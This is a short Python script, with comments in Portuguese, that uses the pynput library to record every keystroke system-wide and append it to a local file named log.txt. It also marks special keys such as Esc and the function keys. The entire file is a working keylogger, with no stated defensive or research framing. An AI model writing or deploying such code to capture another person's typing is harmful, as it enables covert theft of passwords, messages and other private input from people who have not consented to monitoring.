from pynput import keyboard

# Teclas a ignorar (você pode adicionar mais, se desejar)
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd,
    keyboard.Key.tab, # Adicionado, pois já é tratado separadamente
    keyboard.Key.enter, # Adicionado, pois já é tratado separadamente
    keyboard.Key.space, # Adicionado, pois já é tratado separadamente
    keyboard.Key.backspace, # Adicionado, pois já é tratado separadamente
    keyboard.Key.esc, # Adicionado, pois já é tratado separadamente
}

def on_press(key):
    with open("log.txt", "a", encoding="utf-8") as f:
        try:
            # Tenta obter o caractere para teclas normais (letras, números, símbolos)
            char = key.char
            if char is not None:
                f.write(char)
        except AttributeError:
            # Se não tiver o atributo 'char', é uma tecla especial
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("  ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                # Se for uma das teclas para ignorar, não faz nada
                pass
            else:
                # Para outras teclas especiais (setas, F1, etc.)
                # Escreve a representação da tecla entre colchetes
                f.write(f" [{key.name}] ") # Usamos .name para uma representação mais limpa

# Configura o listener para chamar on_press a cada tecla pressionada
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
